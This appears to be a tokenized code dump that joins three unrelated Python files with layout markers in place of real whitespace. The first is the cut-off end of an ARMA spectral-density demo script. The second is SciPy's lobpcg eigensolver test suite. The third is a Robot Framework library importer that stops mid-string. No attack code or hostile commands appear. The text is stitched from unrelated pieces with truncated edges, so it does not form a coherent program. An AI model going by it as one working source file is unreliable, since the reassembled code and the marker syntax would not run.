'__main__' : <newline> <indent> def maxabs ( x , y ) : <newline> <indent> return np . max ( np . abs ( x - y ) ) <newline> <dedent> nobs = 200  # 10000 <encdom> <newline> ar = [ 1 , 0.0 ] <newline> ma = [ 1 , 0.0 ] <newline> ar2 = np . zeros ( nobs ) <newline> ar2 [ : 2 ] = [ 1 , - 0.9 ] <newline> uni = np . zeros ( nobs ) <newline> uni [ 0 ] = 1. <newline>  # arrep ▁ = ▁ signal.lfilter(ma, ▁ ar, ▁ ar2) <encdom>  # marep ▁ = ▁ signal.lfilter([1],arrep, ▁ uni) <encdom>  # ▁ same ▁ faster: <encdom> arcomb = np . convolve ( ar , ar2 , mode = 'same' ) <newline> marep = signal . lfilter ( ma , arcomb , uni )  # [len(ma):] <encdom> <newline> print ( marep [ : 10 ] ) <newline> mafr = fft . fft ( marep ) <newline> rvs = np . random . normal ( size = nobs ) <newline> datafr = fft . fft ( rvs ) <newline> y = fft . ifft ( mafr * datafr ) <newline> print ( np . corrcoef ( np . c_ [ y [ 2 : ] , y [ 1 : - 1 ] , y [ : - 2 ] ] , rowvar = 0 ) ) <newline> arrep = signal . lfilter ( [ 1 ] , marep , uni ) <newline> print ( arrep [ : 20 ] )  # ▁ roundtrip ▁ to ▁ ar <encdom> <newline> arfr = fft . fft ( arrep ) <newline> yfr = fft . fft ( y ) <newline> x = fft . ifft ( arfr * yfr ) . real  # imag ▁ part ▁ is ▁ e-15 <encdom> <newline>  # ▁ the ▁ next ▁ two ▁ are ▁ equal, ▁ roundtrip ▁ works <encdom> print ( x [ : 5 ] ) <newline> print ( rvs [ : 5 ] ) <newline> print ( np . corrcoef ( np . c_ [ x [ 2 : ] , x [ 1 : - 1 ] , x [ : - 2 ] ] , rowvar = 0 ) ) <newline>  # ▁ ARMA ▁ filter ▁ using ▁ fft ▁ with ▁ ratio ▁ of ▁ fft ▁ of ▁ ma/ar ▁ lag ▁ polynomial <encdom>  # ▁ seems ▁ much ▁ faster ▁ than ▁ using ▁ lfilter <encdom>  # padding, ▁ note ▁ arcomb ▁ is ▁ already ▁ full ▁ length <encdom> arcombp = np . zeros ( nobs ) <newline> arcombp [ : len ( arcomb ) ] = arcomb <newline> map_ = np . zeros ( nobs )  # rename: ▁ map ▁ was ▁ shadowing ▁ builtin <encdom> <newline> map_ [ : len ( ma ) ] = ma <newline> ar0fr = fft . fft ( arcombp ) <newline> ma0fr = fft . fft ( map_ ) <newline> y2 = fft . ifft ( ma0fr / ar0fr * datafr ) <newline>  # the ▁ next ▁ two ▁ are ▁ (almost) ▁ equal ▁ in ▁ real ▁ part, ▁ almost ▁ zero ▁ but ▁ different ▁ in ▁ imag <encdom> print ( y2 [ : 10 ] ) <newline> print ( y [ : 10 ] ) <newline> print ( maxabs ( y , y2 ) )  # ▁ from ▁ chfdiscrete <encdom> <newline>  # 1.1282071239631782e-014 <encdom> ar = [ 1 , - 0.4 ] <newline> ma = [ 1 , 0.2 ] <newline> arma1 = ArmaFft ( [ 1 , - 0.5 , 0 , 0 , 0 , 00 , - 0.7 , 0.3 ] , [ 1 , 0.8 ] , nobs ) <newline> nfreq = nobs <newline> w = np . linspace ( 0 , np . pi , nfreq ) <newline> w2 = np . linspace ( 0 , 2 * np . pi , nfreq ) <newline> import matplotlib . pyplot as plt <newline> plt . close ( 'all' ) <newline> plt . figure ( ) <newline> spd1 , w1 = arma1 . spd ( 2 ** 10 ) <newline> print ( spd1 . shape ) <newline> _ = plt . plot ( spd1 ) <newline> plt . title ( 'spd ▁ fft ▁ complex' ) <newline> plt . figure ( ) <newline> spd2 , w2 = arma1 . spdshift ( 2 ** 10 ) <newline> print ( spd2 . shape ) <newline> _ = plt . plot ( w2 , spd2 ) <newline> plt . title ( 'spd ▁ fft ▁ shift' ) <newline> plt . figure ( ) <newline> spd3 , w3 = arma1 . spddirect ( 2 ** 10 ) <newline> print ( spd3 . shape ) <newline> _ = plt . plot ( w3 , spd3 ) <newline> plt . title ( 'spd ▁ fft ▁ direct' ) <newline> plt . figure ( ) <newline> spd3b = arma1 . _spddirect2 ( 2 ** 10 ) <newline> print ( spd3b . shape ) <newline> _ = plt . plot ( spd3b ) <newline> plt . title ( 'spd ▁ fft ▁ direct ▁ mirrored' ) <newline> plt . figure ( ) <newline> spdr , wr = arma1 . spdroots ( w ) <newline> print ( spdr . shape ) <newline> plt . plot ( w , spdr ) <newline> plt . title ( 'spd ▁ from ▁ roots' ) <newline> plt . figure ( ) <newline> spdar1_ = spdar1 ( arma1 . ar , w ) <newline> print ( spdar1_ . shape ) <newline> _ = plt . plot ( w , spdar1_ ) <newline> plt . title ( 'spd ▁ ar1' ) <newline> plt . figure ( ) <newline> wper , spdper = arma1 . periodogram ( nfreq ) <newline> print ( spdper . shape ) <newline> _ = plt . plot ( w , spdper ) <newline> plt . title ( 'periodogram' ) <newline> startup = 1000 <newline> rvs = arma1 . generate_sample ( startup + 10000 ) [ startup : ] <newline> import matplotlib . mlab as mlb <newline> plt . figure ( ) <newline> sdm , wm = mlb . psd ( x ) <newline> print ( 'sdm.shape' , sdm . shape ) <newline> sdm = sdm . ravel ( ) <newline> plt . plot ( wm , sdm ) <newline> plt . title ( 'matplotlib' ) <newline> from nitime . algorithms import LD_AR_est <newline>  # yule_AR_est(s, ▁ order, ▁ Nfreqs) <encdom> wnt , spdnt = LD_AR_est ( rvs , 10 , 512 ) <newline> plt . figure ( ) <newline> print ( 'spdnt.shape' , spdnt . shape ) <newline> _ = plt . plot ( spdnt . ravel ( ) ) <newline> print ( spdnt [ : 10 ] ) <newline> plt . title ( 'nitime' ) <newline> fig = plt . figure ( ) <newline> arma1 . plot4 ( fig ) <newline>  # plt.show() <encdom> <dedent>
 """ ▁ Test ▁ functions ▁ for ▁ the ▁ sparse.linalg.eigen.lobpcg ▁ module <strnewline> """  <newline> import itertools <newline> import platform <newline> import numpy as np <newline> from numpy . testing import ( assert_almost_equal , assert_equal , assert_allclose , assert_array_less ) <newline> import pytest <newline> from numpy import ones , r_ , diag <newline> from numpy . random import rand <newline> from scipy . linalg import eig , eigh , toeplitz , orth <newline> from scipy . sparse import spdiags , diags , eye <newline> from scipy . sparse . linalg import eigs , LinearOperator <newline> from scipy . sparse . linalg . eigen . lobpcg import lobpcg <newline> def ElasticRod ( n ) : <newline> <indent>  """ Build ▁ the ▁ matrices ▁ for ▁ the ▁ generalized ▁ eigenvalue ▁ problem ▁ of ▁ the <strnewline> ▁ fixed-free ▁ elastic ▁ rod ▁ vibration ▁ model. <strnewline> ▁ """  <newline> L = 1.0 <newline> le = L / n <newline> rho = 7.85e3 <newline> S = 1.e-4 <newline> E = 2.1e11 <newline> mass = rho * S * le / 6. <newline> k = E * S / le <newline> A = k * ( diag ( r_ [ 2. * ones ( n - 1 ) , 1 ] ) - diag ( ones ( n - 1 ) , 1 ) - diag ( ones ( n - 1 ) , - 1 ) ) <newline> B = mass * ( diag ( r_ [ 4. * ones ( n - 1 ) , 2 ] ) + diag ( ones ( n - 1 ) , 1 ) + diag ( ones ( n - 1 ) , - 1 ) ) <newline> return A , B <newline> <dedent> def MikotaPair ( n ) : <newline> <indent>  """ Build ▁ a ▁ pair ▁ of ▁ full ▁ diagonal ▁ matrices ▁ for ▁ the ▁ generalized ▁ eigenvalue <strnewline> ▁ problem. ▁ The ▁ Mikota ▁ pair ▁ acts ▁ as ▁ a ▁ nice ▁ test ▁ since ▁ the ▁ eigenvalues ▁ are ▁ the <strnewline> ▁ squares ▁ of ▁ the ▁ integers ▁ n, ▁ n=1,2,... <strnewline> ▁ """  <newline> x = np . arange ( 1 , n + 1 ) <newline> B = diag ( 1. / x ) <newline> y = np . arange ( n - 1 , 0 , - 1 ) <newline> z = np . arange ( 2 * n - 1 , 0 , - 2 ) <newline> A = diag ( z ) - diag ( y , - 1 ) - diag ( y , 1 ) <newline> return A , B <newline> <dedent> def compare_solutions ( A , B , m ) : <newline> <indent>  """ Check ▁ eig ▁ vs. ▁ lobpcg ▁ consistency. <strnewline> ▁ """  <newline> n = A . shape [ 0 ] <newline> np . random . seed ( 0 ) <newline> V = rand ( n , m ) <newline> X = orth ( V ) <newline> eigvals , _ = lobpcg ( A , X , B = B , tol = 1e-5 , maxiter = 30 , largest = False ) <newline> eigvals . sort ( ) <newline> w , _ = eig ( A , b = B ) <newline> w . sort ( ) <newline> assert_almost_equal ( w [ : int ( m / 2 ) ] , eigvals [ : int ( m / 2 ) ] , decimal = 2 ) <newline> <dedent> def test_Small ( ) : <newline> <indent> A , B = ElasticRod ( 10 ) <newline> compare_solutions ( A , B , 10 ) <newline> A , B = MikotaPair ( 10 ) <newline> compare_solutions ( A , B , 10 ) <newline> <dedent> def test_ElasticRod ( ) : <newline> <indent> A , B = ElasticRod ( 100 ) <newline> compare_solutions ( A , B , 20 ) <newline> <dedent> def test_MikotaPair ( ) : <newline> <indent> A , B = MikotaPair ( 100 ) <newline> compare_solutions ( A , B , 20 ) <newline> <dedent> def test_regression ( ) : <newline> <indent>  """ Check ▁ the ▁ eigenvalue ▁ of ▁ the ▁ identity ▁ matrix ▁ is ▁ one. <strnewline> ▁ """  <newline>  # ▁ https://mail.python.org/pipermail/scipy-user/2010-October/026944.html <encdom> n = 10 <newline> X = np . ones ( ( n , 1 ) ) <newline> A = np . identity ( n ) <newline> w , _ = lobpcg ( A , X ) <newline> assert_allclose ( w , [ 1 ] ) <newline> <dedent> def test_diagonal ( ) : <newline> <indent>  """ Check ▁ for ▁ diagonal ▁ matrices. <strnewline> ▁ """  <newline>  # ▁ This ▁ test ▁ was ▁ moved ▁ from ▁'__main__' ▁ in ▁ lobpcg.py. <encdom>  # ▁ Coincidentally ▁ or ▁ not, ▁ this ▁ is ▁ the ▁ same ▁ eigensystem <encdom>  # ▁ required ▁ to ▁ reproduce ▁ arpack ▁ bug <encdom>  # ▁ https://forge.scilab.org/p/arpack-ng/issues/1397/ <encdom>  # ▁ even ▁ using ▁ the ▁ same ▁ n=100. <encdom> np . random . seed ( 1234 ) <newline>  # ▁ The ▁ system ▁ of ▁ interest ▁ is ▁ of ▁ size ▁ n ▁ x ▁ n. <encdom> n = 100 <newline>  # ▁ We ▁ care ▁ about ▁ only ▁ m ▁ eigenpairs. <encdom> m = 4 <newline>  # ▁ Define ▁ the ▁ generalized ▁ eigenvalue ▁ problem ▁ Av ▁ = ▁ cBv <encdom>  # ▁ where ▁ (c, ▁ v) ▁ is ▁ a ▁ generalized ▁ eigenpair, <encdom>  # ▁ and ▁ where ▁ we ▁ choose ▁ A ▁ to ▁ be ▁ the ▁ diagonal ▁ matrix ▁ whose ▁ entries ▁ are ▁ 1..n <encdom>  # ▁ and ▁ where ▁ B ▁ is ▁ chosen ▁ to ▁ be ▁ the ▁ identity ▁ matrix. <encdom> vals = np . arange ( 1 , n + 1 , dtype = float ) <newline> A = diags ( [ vals ] , [ 0 ] , ( n , n ) ) <newline> B = eye ( n ) <newline>  # ▁ Let ▁ the ▁ preconditioner ▁ M ▁ be ▁ the ▁ inverse ▁ of ▁ A. <encdom> M = diags ( [ 1. / vals ] , [ 0 ] , ( n , n ) ) <newline>  # ▁ Pick ▁ random ▁ initial ▁ vectors. <encdom> X = np . random . rand ( n , m ) <newline>  # ▁ Require ▁ that ▁ the ▁ returned ▁ eigenvectors ▁ be ▁ in ▁ the ▁ orthogonal ▁ complement <encdom>  # ▁ of ▁ the ▁ first ▁ few ▁ standard ▁ basis ▁ vectors. <encdom> m_excluded = 3 <newline> Y = np . eye ( n , m_excluded ) <newline> eigvals , vecs = lobpcg ( A , X , B , M = M , Y = Y , tol = 1e-4 , maxiter = 40 , largest = False ) <newline> assert_allclose ( eigvals , np . arange ( 1 + m_excluded , 1 + m_excluded + m ) ) <newline> _check_eigen ( A , eigvals , vecs , rtol = 1e-3 , atol = 1e-3 ) <newline> <dedent> def _check_eigen ( M , w , V , rtol = 1e-8 , atol = 1e-14 ) : <newline> <indent>  """ Check ▁ if ▁ the ▁ eigenvalue ▁ residual ▁ is ▁ small. <strnewline> ▁ """  <newline> mult_wV = np . multiply ( w , V ) <newline> dot_MV = M . dot ( V ) <newline> assert_allclose ( mult_wV , dot_MV , rtol = rtol , atol = atol ) <newline> <dedent> def _check_fiedler ( n , p ) : <newline> <indent>  """ Check ▁ the ▁ Fiedler ▁ vector ▁ computation. <strnewline> ▁ """  <newline>  # ▁ This ▁ is ▁ not ▁ necessarily ▁ the ▁ recommended ▁ way ▁ to ▁ find ▁ the ▁ Fiedler ▁ vector. <encdom> np . random . seed ( 1234 ) <newline> col = np . zeros ( n ) <newline> col [ 1 ] = 1 <newline> A = toeplitz ( col ) <newline> D = np . diag ( A . sum ( axis = 1 ) ) <newline> L = D - A <newline>  # ▁ Compute ▁ the ▁ full ▁ eigendecomposition ▁ using ▁ tricks, ▁ e.g. <encdom>  # ▁ http://www.cs.yale.edu/homes/spielman/561/2009/lect02-09.pdf <encdom> tmp = np . pi * np . arange ( n ) / n <newline> analytic_w = 2 * ( 1 - np . cos ( tmp ) ) <newline> analytic_V = np . cos ( np . outer ( np . arange ( n ) + 1 / 2 , tmp ) ) <newline> _check_eigen ( L , analytic_w , analytic_V ) <newline>  # ▁ Compute ▁ the ▁ full ▁ eigendecomposition ▁ using ▁ eigh. <encdom> eigh_w , eigh_V = eigh ( L ) <newline> _check_eigen ( L , eigh_w , eigh_V ) <newline>  # ▁ Check ▁ that ▁ the ▁ first ▁ eigenvalue ▁ is ▁ near ▁ zero ▁ and ▁ that ▁ the ▁ rest ▁ agree. <encdom> assert_array_less ( np . abs ( [ eigh_w [ 0 ] , analytic_w [ 0 ] ] ) , 1e-14 ) <newline> assert_allclose ( eigh_w [ 1 : ] , analytic_w [ 1 : ] ) <newline>  # ▁ Check ▁ small ▁ lobpcg ▁ eigenvalues. <encdom> X = analytic_V [ : , : p ] <newline> lobpcg_w , lobpcg_V = lobpcg ( L , X , largest = False ) <newline> assert_equal ( lobpcg_w . shape , ( p , ) ) <newline> assert_equal ( lobpcg_V . shape , ( n , p ) ) <newline> _check_eigen ( L , lobpcg_w , lobpcg_V ) <newline> assert_array_less ( np . abs ( np . min ( lobpcg_w ) ) , 1e-14 ) <newline> assert_allclose ( np . sort ( lobpcg_w ) [ 1 : ] , analytic_w [ 1 : p ] ) <newline>  # ▁ Check ▁ large ▁ lobpcg ▁ eigenvalues. <encdom> X = analytic_V [ : , - p : ] <newline> lobpcg_w , lobpcg_V = lobpcg ( L , X , largest = True ) <newline> assert_equal ( lobpcg_w . shape , ( p , ) ) <newline> assert_equal ( lobpcg_V . shape , ( n , p ) ) <newline> _check_eigen ( L , lobpcg_w , lobpcg_V ) <newline> assert_allclose ( np . sort ( lobpcg_w ) , analytic_w [ - p : ] ) <newline>  # ▁ Look ▁ for ▁ the ▁ Fiedler ▁ vector ▁ using ▁ good ▁ but ▁ not ▁ exactly ▁ correct ▁ guesses. <encdom> fiedler_guess = np . concatenate ( ( np . ones ( n // 2 ) , - np . ones ( n - n // 2 ) ) ) <newline> X = np . vstack ( ( np . ones ( n ) , fiedler_guess ) ) . T <newline> lobpcg_w , _ = lobpcg ( L , X , largest = False ) <newline>  # ▁ Mathematically, ▁ the ▁ smaller ▁ eigenvalue ▁ should ▁ be ▁ zero <encdom>  # ▁ and ▁ the ▁ larger ▁ should ▁ be ▁ the ▁ algebraic ▁ connectivity. <encdom> lobpcg_w = np . sort ( lobpcg_w ) <newline> assert_allclose ( lobpcg_w , analytic_w [ : 2 ] , atol = 1e-14 ) <newline> <dedent> def test_fiedler_small_8 ( ) : <newline> <indent>  """ Check ▁ the ▁ dense ▁ workaround ▁ path ▁ for ▁ small ▁ matrices. <strnewline> ▁ """  <newline>  # ▁ This ▁ triggers ▁ the ▁ dense ▁ path ▁ because ▁ 8 ▁ < ▁ 2*5. <encdom> _check_fiedler ( 8 , 2 ) <newline> <dedent> def test_fiedler_large_12 ( ) : <newline> <indent>  """ Check ▁ the ▁ dense ▁ workaround ▁ path ▁ avoided ▁ for ▁ non-small ▁ matrices. <strnewline> ▁ """  <newline>  # ▁ This ▁ does ▁ not ▁ trigger ▁ the ▁ dense ▁ path, ▁ because ▁ 2*5 ▁ <= ▁ 12. <encdom> _check_fiedler ( 12 , 2 ) <newline> <dedent> def test_hermitian ( ) : <newline> <indent>  """ Check ▁ complex-value ▁ Hermitian ▁ cases. <strnewline> ▁ """  <newline> np . random . seed ( 1234 ) <newline> sizes = [ 3 , 10 , 50 ] <newline> ks = [ 1 , 3 , 10 , 50 ] <newline> gens = [ True , False ] <newline> for size , k , gen in itertools . product ( sizes , ks , gens ) : <newline> <indent> if k > size : <newline> <indent> continue <newline> <dedent> H = np . random . rand ( size , size ) + 1.j * np . random . rand ( size , size ) <newline> H = 10 * np . eye ( size ) + H + H . T . conj ( ) <newline> X = np . random . rand ( size , k ) <newline> if not gen : <newline> <indent> B = np . eye ( size ) <newline> w , v = lobpcg ( H , X , maxiter = 5000 ) <newline> w0 , _ = eigh ( H ) <newline> <dedent> else : <newline> <indent> B = np . random . rand ( size , size ) + 1.j * np . random . rand ( size , size ) <newline> B = 10 * np . eye ( size ) + B . dot ( B . T . conj ( ) ) <newline> w , v = lobpcg ( H , X , B , maxiter = 5000 , largest = False ) <newline> w0 , _ = eigh ( H , B ) <newline> <dedent> for wx , vx in zip ( w , v . T ) : <newline>  # ▁ Check ▁ eigenvector <encdom> <indent> assert_allclose ( np . linalg . norm ( H . dot ( vx ) - B . dot ( vx ) * wx ) / np . linalg . norm ( H . dot ( vx ) ) , 0 , atol = 5e-4 , rtol = 0 ) <newline>  # ▁ Compare ▁ eigenvalues <encdom> j = np . argmin ( abs ( w0 - wx ) ) <newline> assert_allclose ( wx , w0 [ j ] , rtol = 1e-4 ) <newline>  # ▁ The ▁ n=5 ▁ case ▁ tests ▁ the ▁ alternative ▁ small ▁ matrix ▁ code ▁ path ▁ that ▁ uses ▁ eigh(). <encdom> <dedent> <dedent> <dedent> @ pytest . mark . parametrize ( 'n, ▁ atol' , [ ( 20 , 1e-3 ) , ( 5 , 1e-8 ) ] ) <newline> def test_eigs_consistency ( n , atol ) : <newline> <indent>  """ Check ▁ eigs ▁ vs. ▁ lobpcg ▁ consistency. <strnewline> ▁ """  <newline> vals = np . arange ( 1 , n + 1 , dtype = np . float64 ) <newline> A = spdiags ( vals , 0 , n , n ) <newline> np . random . seed ( 345678 ) <newline> X = np . random . rand ( n , 2 ) <newline> lvals , lvecs = lobpcg ( A , X , largest = True , maxiter = 100 ) <newline> vals , _ = eigs ( A , k = 2 ) <newline> _check_eigen ( A , lvals , lvecs , atol = atol , rtol = 0 ) <newline> assert_allclose ( np . sort ( vals ) , np . sort ( lvals ) , atol = 1e-14 ) <newline> <dedent> def test_verbosity ( tmpdir ) : <newline> <indent>  """ Check ▁ that ▁ nonzero ▁ verbosity ▁ level ▁ code ▁ runs. <strnewline> ▁ """  <newline> A , B = ElasticRod ( 100 ) <newline> n = A . shape [ 0 ] <newline> m = 20 <newline> np . random . seed ( 0 ) <newline> V = rand ( n , m ) <newline> X = orth ( V ) <newline> _ , _ = lobpcg ( A , X , B = B , tol = 1e-5 , maxiter = 30 , largest = False , verbosityLevel = 9 ) <newline> <dedent> @ pytest . mark . xfail ( platform . machine ( ) == 'ppc64le' , reason = "fails ▁ on ▁ ppc64le" ) <newline> def test_tolerance_float32 ( ) : <newline> <indent>  """ Check ▁ lobpcg ▁ for ▁ attainable ▁ tolerance ▁ in ▁ float32. <strnewline> ▁ """  <newline> np . random . seed ( 1234 ) <newline> n = 50 <newline> m = 3 <newline> vals = - np . arange ( 1 , n + 1 ) <newline> A = diags ( [ vals ] , [ 0 ] , ( n , n ) ) <newline> A = A . astype ( np . float32 ) <newline> X = np . random . randn ( n , m ) <newline> X = X . astype ( np . float32 ) <newline> eigvals , _ = lobpcg ( A , X , tol = 1e-9 , maxiter = 50 , verbosityLevel = 0 ) <newline> assert_allclose ( eigvals , - np . arange ( 1 , 1 + m ) , atol = 1e-5 ) <newline> <dedent> def test_random_initial_float32 ( ) : <newline> <indent>  """ Check ▁ lobpcg ▁ in ▁ float32 ▁ for ▁ specific ▁ initial. <strnewline> ▁ """  <newline> np . random . seed ( 3 ) <newline> n = 50 <newline> m = 4 <newline> vals = - np . arange ( 1 , n + 1 ) <newline> A = diags ( [ vals ] , [ 0 ] , ( n , n ) ) <newline> A = A . astype ( np . float32 ) <newline> X = np . random . rand ( n , m ) <newline> X = X . astype ( np . float32 ) <newline> eigvals , _ = lobpcg ( A , X , tol = 1e-3 , maxiter = 50 , verbosityLevel = 1 ) <newline> assert_allclose ( eigvals , - np . arange ( 1 , 1 + m ) , atol = 1e-2 ) <newline> <dedent> def test_maxit_None ( ) : <newline> <indent>  """ Check ▁ lobpcg ▁ if ▁ maxit=None ▁ runs ▁ 20 ▁ iterations ▁ (the ▁ default) <strnewline> ▁ by ▁ checking ▁ the ▁ size ▁ of ▁ the ▁ iteration ▁ history ▁ output, ▁ which ▁ should <strnewline> ▁ be ▁ the ▁ number ▁ of ▁ iterations ▁ plus ▁ 2 ▁ (initial ▁ and ▁ final ▁ values). <strnewline> ▁ """  <newline> np . random . seed ( 1566950023 ) <newline> n = 50 <newline> m = 4 <newline> vals = - np . arange ( 1 , n + 1 ) <newline> A = diags ( [ vals ] , [ 0 ] , ( n , n ) ) <newline> A = A . astype ( np . float32 ) <newline> X = np . random . randn ( n , m ) <newline> X = X . astype ( np . float32 ) <newline> _ , _ , l_h = lobpcg ( A , X , tol = 1e-8 , maxiter = 20 , retLambdaHistory = True ) <newline> assert_allclose ( np . shape ( l_h ) [ 0 ] , 20 + 2 ) <newline> <dedent> @ pytest . mark . slow <newline> def test_diagonal_data_types ( ) : <newline> <indent>  """ Check ▁ lobpcg ▁ for ▁ diagonal ▁ matrices ▁ for ▁ all ▁ matrix ▁ types. <strnewline> ▁ """  <newline> np . random . seed ( 1234 ) <newline> n = 40 <newline> m = 4 <newline>  # ▁ Define ▁ the ▁ generalized ▁ eigenvalue ▁ problem ▁ Av ▁ = ▁ cBv <encdom>  # ▁ where ▁ (c, ▁ v) ▁ is ▁ a ▁ generalized ▁ eigenpair, <encdom>  # ▁ and ▁ where ▁ we ▁ choose ▁ A ▁ and ▁ B ▁ to ▁ be ▁ diagonal. <encdom> vals = np . arange ( 1 , n + 1 ) <newline> list_sparse_format = [ 'bsr' , 'coo' , 'csc' , 'csr' , 'dia' , 'dok' , 'lil' ] <newline> sparse_formats = len ( list_sparse_format ) <newline> for s_f_i , s_f in enumerate ( list_sparse_format ) : <newline> <indent> As64 = diags ( [ vals * vals ] , [ 0 ] , ( n , n ) , format = s_f ) <newline> As32 = As64 . astype ( np . float32 ) <newline> Af64 = As64 . toarray ( ) <newline> Af32 = Af64 . astype ( np . float32 ) <newline> listA = [ Af64 , As64 , Af32 , As32 ] <newline> Bs64 = diags ( [ vals ] , [ 0 ] , ( n , n ) , format = s_f ) <newline> Bf64 = Bs64 . toarray ( ) <newline> listB = [ Bf64 , Bs64 ] <newline>  # ▁ Define ▁ the ▁ preconditioner ▁ function ▁ as ▁ LinearOperator. <encdom> Ms64 = diags ( [ 1. / vals ] , [ 0 ] , ( n , n ) , format = s_f ) <newline> def Ms64precond ( x ) : <newline> <indent> return Ms64 @ x <newline> <dedent> Ms64precondLO = LinearOperator ( matvec = Ms64precond , matmat = Ms64precond , shape = ( n , n ) , dtype = float ) <newline> Mf64 = Ms64 . toarray ( ) <newline> def Mf64precond ( x ) : <newline> <indent> return Mf64 @ x <newline> <dedent> Mf64precondLO = LinearOperator ( matvec = Mf64precond , matmat = Mf64precond , shape = ( n , n ) , dtype = float ) <newline> Ms32 = Ms64 . astype ( np . float32 ) <newline> def Ms32precond ( x ) : <newline> <indent> return Ms32 @ x <newline> <dedent> Ms32precondLO = LinearOperator ( matvec = Ms32precond , matmat = Ms32precond , shape = ( n , n ) , dtype = np . float32 ) <newline> Mf32 = Ms32 . toarray ( ) <newline> def Mf32precond ( x ) : <newline> <indent> return Mf32 @ x <newline> <dedent> Mf32precondLO = LinearOperator ( matvec = Mf32precond , matmat = Mf32precond , shape = ( n , n ) , dtype = np . float32 ) <newline> listM = [ None , Ms64precondLO , Mf64precondLO , Ms32precondLO , Mf32precondLO ] <newline>  # ▁ Setup ▁ matrix ▁ of ▁ the ▁ initial ▁ approximation ▁ to ▁ the ▁ eigenvectors <encdom>  # ▁ (cannot ▁ be ▁ sparse ▁ array). <encdom> Xf64 = np . random . rand ( n , m ) <newline> Xf32 = Xf64 . astype ( np . float32 ) <newline> listX = [ Xf64 , Xf32 ] <newline>  # ▁ Require ▁ that ▁ the ▁ returned ▁ eigenvectors ▁ be ▁ in ▁ the ▁ orthogonal ▁ complement <encdom>  # ▁ of ▁ the ▁ first ▁ few ▁ standard ▁ basis ▁ vectors ▁ (cannot ▁ be ▁ sparse ▁ array). <encdom> m_excluded = 3 <newline> Yf64 = np . eye ( n , m_excluded , dtype = float ) <newline> Yf32 = np . eye ( n , m_excluded , dtype = np . float32 ) <newline> listY = [ Yf64 , Yf32 ] <newline> tests = list ( itertools . product ( listA , listB , listM , listX , listY ) ) <newline>  # ▁ This ▁ is ▁ one ▁ of ▁ the ▁ slower ▁ tests ▁ because ▁ there ▁ are ▁ >1,000 ▁ configs <encdom>  # ▁ to ▁ test ▁ here, ▁ instead ▁ of ▁ checking ▁ product ▁ of ▁ all ▁ input, ▁ output ▁ types <encdom>  # ▁ test ▁ each ▁ configuration ▁ for ▁ the ▁ first ▁ sparse ▁ format, ▁ and ▁ then <encdom>  # ▁ for ▁ one ▁ additional ▁ sparse ▁ format. ▁ this ▁ takes ▁ 2/7=30% ▁ as ▁ long ▁ as <encdom>  # ▁ testing ▁ all ▁ configurations ▁ for ▁ all ▁ sparse ▁ formats. <encdom> if s_f_i > 0 : <newline> <indent> tests = tests [ s_f_i - 1 : : sparse_formats - 1 ] <newline> <dedent> for A , B , M , X , Y in tests : <newline> <indent> eigvals , _ = lobpcg ( A , X , B = B , M = M , Y = Y , tol = 1e-4 , maxiter = 100 , largest = False ) <newline> assert_allclose ( eigvals , np . arange ( 1 + m_excluded , 1 + m_excluded + m ) ) <newline> <dedent> <dedent> <dedent>
 # ▁ Copyright ▁ 2008-2015 ▁ Nokia ▁ Networks <encdom>  # ▁ Copyright ▁ 2016- ▁ Robot ▁ Framework ▁ Foundation <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom> import copy <newline> import os . path <newline> from robot . output import LOGGER <newline> from robot . errors import FrameworkError <newline> from robot . utils import normpath , seq2str2 , is_string <newline> from . builder import ResourceFileBuilder <newline> from . handlerstore import HandlerStore <newline> from . testlibraries import TestLibrary <newline> class Importer ( object ) : <newline> <indent> def __init__ ( self ) : <newline> <indent> self . _library_cache = ImportCache ( ) <newline> self . _resource_cache = ImportCache ( ) <newline> <dedent> def reset ( self ) : <newline> <indent> self . __init__ ( ) <newline> <dedent> def close_global_library_listeners ( self ) : <newline> <indent> for lib in self . _library_cache . values ( ) : <newline> <indent> lib . close_global_listeners ( ) <newline> <dedent> <dedent> def import_library ( self , name , args , alias , variables ) : <newline> <indent> lib = TestLibrary ( name , args , variables , create_handlers = False ) <newline> positional , named = lib . positional_args , lib . named_args <newline> lib = self . _import_library ( name , positional , named , lib ) <newline> if alias : <newline> <indent> alias = variables . replace_scalar ( alias ) <newline> lib = self . _copy_library ( lib , alias ) <newline> LOGGER . info ( "Imported ▁ library ▁'%s' ▁ with ▁ name ▁'%s'" % ( name , alias ) ) <newline> <dedent> return lib <newline> <dedent> def import_resource ( self , path ) : <newline> <indent> if path in self . _resource_cache : <newline> <indent> LOGGER . info ( "Found ▁ resource ▁ file ▁'%s' ▁ from ▁ cache" % path ) <newline> <dedent> else : <newline> <indent> resource = ResourceFileBuilder ( ) . build ( path ) <newline> self . _resource_cache [ path ] = resource <newline> <dedent> return self . _resource_cache [ path ] <newline> <dedent> def _import_library ( self , name , positional , named , lib ) : <newline> <indent> args = positional + [ '%s=%s' % arg for arg in named ] <newline> key = ( name , positional , named ) <newline> if key in self . _library_cache : <newline> <indent> LOGGER . info ( "Found ▁ test ▁ library ▁'%s' ▁ with ▁ arguments ▁ %s ▁ from ▁ cache" % ( name , seq2str2 ( args ) ) ) <newline> return self . _library_cache [ key ] <newline> <dedent> lib . create_handlers ( ) <newline> self . _library_cache [ key ] = lib <newline> self . _log_imported_library ( name , args , lib ) <newline> return lib <newline> <dedent> def _log_imported_library ( self , name , args , lib ) : <newline> <indent> type = lib . __class__ . __name__ . replace ( 'Library' , '' ) . lower ( ) [ 1 : ] <newline> listener = ', ▁ with ▁ listener' if lib . has_listener else '' <newline> LOGGER . info ( "Imported ▁ library ▁'%s' ▁ with 